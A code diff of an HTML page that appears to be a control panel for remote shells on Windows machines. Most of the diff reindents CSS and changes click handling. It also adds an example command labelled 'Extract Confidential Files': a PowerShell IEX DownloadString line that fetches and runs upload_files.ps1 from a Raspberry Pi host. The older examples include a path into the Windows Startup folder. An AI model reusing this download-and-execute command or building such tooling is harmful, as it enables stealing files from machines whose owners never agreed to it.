@@ -39,17 +39,17 @@
       overflow-y: auto;
     }
 
-.responsecontainer p{
-	margin-left: 20px
-}
+    .responsecontainer p{
+    	margin-left: 20px
+    }
 
-.responsecontainer .response{
-opacity: 0.6;
-}
+    .responsecontainer .response{
+    opacity: 0.6;
+    }
 
     .inputcontainer{
       display: flex;
-	border-bottom: 2px solid #999;
+	     border-bottom: 2px solid #999;
       flex-shrink: 0;
     }
 
@@ -61,12 +61,12 @@ opacity: 0.6;
       text-decoration: none;
     }
 
-.button#send{
-background: blue;
-}
-.button#expand{
-margin-left: 3px;
-}
+    .button#send{
+    background: blue;
+    }
+    .button#expand{
+    margin-left: 3px;
+    }
 
     .button:hover{
       opacity: 0.9;
@@ -91,41 +91,44 @@ margin-left: 3px;
       display: none;
     }
 
-.tabbuttoncontainer .toggle{
-padding: 3px 15px;
-}
+    .tabbuttoncontainer .toggle{
+    padding: 3px 15px;
+    }
 
     .tabbuttoncontainer input:checked ~.toggle{
       color: red;
-background: #ddd;
+      background: #ddd;
     }
 
-.examples{
-background: #333;
-color: #eee;
-overflow: hidden;
-overflow-y: scroll;
-height: 230px;
-transition: height 0.2s;
-}
+    .examples{
+      background: #333;
+      color: #eee;
+      overflow: hidden;
+      overflow-y: scroll;
+      height: 230px;
+      transition: height 0.2s;
+    }
 
-.examples ul{
-padding: 15px;
-display: block;
-}
+    .examples ul{
+      padding: 15px;
+      display: block;
+    }
 
-.examples.hidden{
-height: 0px;
-}
+    .examples.hidden{
+      height: 0px;
+    }
 
-.examples li{
-	display: inline-block;
-	cursor: pointer;
-	border: 1px solid;
-	padding: 5px 15px;
-	margin-bottom: 0.25em;
-}
+    .examples li .command{
+    	display: inline-block;
+    	cursor: pointer;
+    	border: 1px solid;
+    	padding: 5px 15px;
+    	margin-bottom: 0.25em;
+    }
 
+    .examples li{
+      display: none;
+    }
 
     .noshelloverlay{
       position: fixed;
@@ -146,6 +149,7 @@ height: 0px;
       transition: 200ms all linear;
       opacity: 1;
     }
+
     .noshelloverlay.hidden{
       opacity: 0;
       pointer-events: none;
@@ -159,8 +163,9 @@ commandsList[0] = "";
 commandsListIndex = 0;
 
 $(document).ready(()=>{
-	$('.examples li').click((a)=>{
-    var command = a.target.innerText
+	$('.examples li').click((event)=>{
+
+    var command = event.target.children[1].innerText
     $('.shell.active input')[0].value = command;
   //  commandsListIndex = commandsList.length-1;
   //  commandsList[commandsList.length-1] = command;
@@ -293,6 +298,14 @@ function toggleExamples(){
   <div class="tabbuttoncontainer"></div>
   <div class="shellcontainer"></div>
   <div class="examples">
+    <ul>
+      <li style="color:#f1c">
+        <span class="name">Extract Confidential Files</span>
+        <span class="command">IEX (New-Object Net.Webclient).DownloadString('http://raspberrypi.local/files/upload_files.ps1')</span>
+      </li>
+    </ul>
+  </div>
+  <div class="examples" style="display: none;">
     <ul>
       <li style="color:#fff">cd 'C:\Users\testo\Desktop'</li>
       <li style="color:#fff">cd "C:\Users\testo\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"</li>
